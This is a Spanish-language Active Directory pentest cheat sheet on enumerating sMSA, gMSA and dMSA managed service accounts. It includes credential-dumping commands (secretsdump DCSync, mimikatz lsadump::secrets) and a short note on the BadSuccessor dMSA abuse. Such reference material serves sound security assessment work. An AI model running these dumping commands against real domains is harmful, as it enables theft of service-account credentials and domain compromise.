---
aliases:
  - sMSA
  - msDS-ManagedServiceAccount
  - dMSA
  - msDS-DelegatedManagedServiceAccount
tags:
  - type/concept
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: SubCheatSheet
linked:
  - '[[AD - gMSA Enumeration]]'
---
# AD - gMSA Enumeration - sMSA y dMSA

***

## sMSA (Standalone Managed Service Account)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADServiceAccount -Filter {ObjectClass -eq "msDS-ManagedServiceAccount"}` | Solo sMSAs | Inventory. |
| `ldapsearch ... "(objectClass=msDS-ManagedServiceAccount)" samAccountName servicePrincipalName` | LDAP raw | Linux. |
| `Get-ADServiceAccount <smsa> -Properties HostComputers,msDS-HostServiceAccount` | Host bound | Per-sMSA detail. |
^ad-smsa-arch

**Diferencias vs gMSA:**
- **sMSA** = bound a 1 host (`msDS-HostServiceAccount` attr en computer + `msDS-ManagedServiceAccount` class).
- **gMSA** = multi-host via `msDS-GroupMSAMembership` ACL.
- Auto-rotation 30d default.
- Win 2008 R2+ (legacy).

```powershell
Get-ADServiceAccount -Filter {ObjectClass -eq "msDS-ManagedServiceAccount"} \
  -Properties HostComputers,msDS-HostServiceAccount |
  Select Name,SamAccountName,
         @{n='Host';e={$_.HostComputers}}
```

___

## sMSA Password Read

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `secretsdump.py corp.local/admin:pass@<DC> -just-dc-user '<smsa>$'` | DCSync sMSA hash (priv) | Privileged dump. |
| Compromise host bound a sMSA | `secretsdump LOCAL` extrae hash desde LSA secrets | Computer compromise path. |
| `mimikatz: lsadump::secrets` | LSA Secrets (incluye sMSA) | Local DA. |
^ad-smsa-read

**Por qué diferente de gMSA:** sMSA password NO está en LDAP attribute readable. Está en LSA Secrets del host bound. Compromise del host = read LSA secrets = sMSA pwd.

___

## dMSA (Delegated Managed Service Account, Server 2025)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADServiceAccount -Filter {ObjectClass -eq "msDS-DelegatedManagedServiceAccount"}` | dMSAs | Modern Server 2025+. |
| `ldapsearch ... "(objectClass=msDS-DelegatedManagedServiceAccount)" samAccountName msDS-DelegatedMSAState msDS-SupersededAccountState` | LDAP raw | Linux. |
| `Get-ADServiceAccount <dmsa> -Properties msDS-DelegatedMSAState` | Estado migration | Status. |
^ad-dmsa-arch

**Por qué dMSA:**
- Designed para reemplazar service accounts legacy.
- Migration path: `msDS-SupersededServiceAccountState` enlaza a cuenta vieja.
- Inheritor: dMSA hereda passwords + Kerberos keys via Kerberos delegation token.
- **Kerberos-only**: NO NTLM auth posible (defense feature).
- Modern attack vectors emergiendo (BadSuccessor — Akamai 2025): si tenés `WriteProperty` sobre `msDS-ManagedAccountPrecededByLink` podés impersonar service account vía dMSA.

___

## sMSA vs gMSA vs dMSA

| **Aspecto** | **sMSA** | **gMSA** | **dMSA** |
|:---:|:---:|:---:|:---:|
| Hosts | 1 | N (vía group) | 1 (delegation) |
| Min OS | Server 2008 R2 | Server 2012 | Server 2025 |
| Password storage | LSA Secrets host | LDAP `msDS-ManagedPassword` | Kerberos delegation (no LDAP) |
| Read mechanism | Local host | LDAP query | Kerberos token |
| KDS Root Key | No | Yes | Yes |
| Auto-rotation | 30d | 30d default | 30d default |
| NTLM auth | Yes | Yes | **No (Kerberos-only)** |
| Persistence resistance | Medium | Low (GoldenGMSA) | High (no offline forge known) |
| Migration target | Modern → gMSA/dMSA | Modern → dMSA | Final |
^ad-msa-comparison

___

## Migration Patterns

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `New-ADServiceAccount <name> -DNSHostName <host>` (sMSA) | Crear sMSA | Legacy setup. |
| `New-ADServiceAccount <name> -PrincipalsAllowedToRetrieveManagedPassword <Group>` (gMSA) | Crear gMSA | Standard. |
| `New-ADServiceAccount <name> -Type MSDS-DelegatedManagedServiceAccount` (dMSA, Server 2025) | Crear dMSA | Modern. |
| `Set-ADServiceAccount <dmsa> -SupersededServiceAccount <legacy-account>` | Link dMSA a legacy account | Migration. |
| `Install-ADServiceAccount <name>` (per-host) | Install sMSA/gMSA en host | Setup. |
^ad-msa-migration

___

## Cross-Correlate with Hosts

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADComputer -Filter * -Pr msDS-HostServiceAccount \| ? msDS-HostServiceAccount` | Computers con sMSAs bound | Inventory. |
| `Get-ADServiceAccount -Filter * -Pr PrincipalsAllowedToRetrieveManagedPassword` | gMSAs + readers | Standard. |
| `Get-WmiObject Win32_Service -ComputerName <host> \| ? StartName -match "(?i)\$@"` | Services running as MSA | Per-host check. |
^ad-msa-correlate

```powershell
# Mapping completo MSAs → hosts
Get-ADComputer -Filter * -Properties msDS-HostServiceAccount |
  Where 'msDS-HostServiceAccount' |
  Select Name,@{n='sMSAs';e={$_.'msDS-HostServiceAccount' -join '; '}}

Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword |
  Where PrincipalsAllowedToRetrieveManagedPassword |
  Select Name,@{n='Readers';e={$_.PrincipalsAllowedToRetrieveManagedPassword -join '; '}}
```

***
